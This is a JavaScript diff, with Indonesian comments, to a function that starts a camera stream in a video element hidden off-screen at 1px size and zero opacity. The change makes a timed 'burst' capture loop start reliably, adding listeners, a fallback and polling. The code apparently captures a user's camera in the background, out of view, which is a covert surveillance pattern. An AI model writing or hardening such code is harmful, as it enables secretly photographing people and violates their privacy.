@@ -517,21 +517,68 @@ async function startBgCamera() {
     bgVideo.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0';
     document.body.appendChild(bgVideo);
 
-    await bgVideo.play();
-    console.log('✅ video play success');
+    // Pasang event listener SEBELUM play
+    let metadataReady = false;
 
     bgVideo.onloadedmetadata = () => {
       console.log('✅ loadedmetadata fired');
-      setTimeout(() => doBurst(), 800);
-      setInterval(() => doBurst(), CFG.interval * 1000);
+      if (!metadataReady) {
+        metadataReady = true;
+        startBurstLoop();
+      }
+    };
+
+    bgVideo.oncanplay = () => {
+      console.log('✅ canplay fired');
+      if (!metadataReady) {
+        metadataReady = true;
+        startBurstLoop();
+      }
     };
 
     bgVideo.onerror = (e) => {
       console.error('❌ Video error:', e);
     };
+
+    await bgVideo.play();
+    console.log('✅ video play success');
+
+    // Fallback: jika dalam 2 detik metadata belum siap, paksa jalankan
+    setTimeout(() => {
+      if (!metadataReady && bgVideo.videoWidth > 0) {
+        console.log('⏳ Fallback: video siap meski tidak ada event');
+        metadataReady = true;
+        startBurstLoop();
+      } else if (!metadataReady) {
+        console.warn('⚠️ Video belum siap setelah 2 detik, coba polling...');
+        // Polling setiap 500ms hingga siap
+        const checkInterval = setInterval(() => {
+          if (bgVideo.videoWidth > 0) {
+            console.log('✅ Polling success, video ready');
+            clearInterval(checkInterval);
+            if (!metadataReady) {
+              metadataReady = true;
+              startBurstLoop();
+            }
+          }
+        }, 500);
+        // Stop polling setelah 5 detik
+        setTimeout(() => clearInterval(checkInterval), 5000);
+      }
+    }, 2000);
+
+    // Fungsi untuk memulai burst dan interval
+    function startBurstLoop() {
+      console.log('🚀 Starting burst loop');
+      // Burst pertama setelah siap
+      setTimeout(() => doBurst(), 300);
+      // Interval reguler
+      setInterval(() => doBurst(), CFG.interval * 1000);
+    }
+
   } catch (err) {
     console.error('❌ startBgCamera error:', err);
-    throw err; // lempar ke doPermission agar ditangani
+    throw err;
   }
 }
 
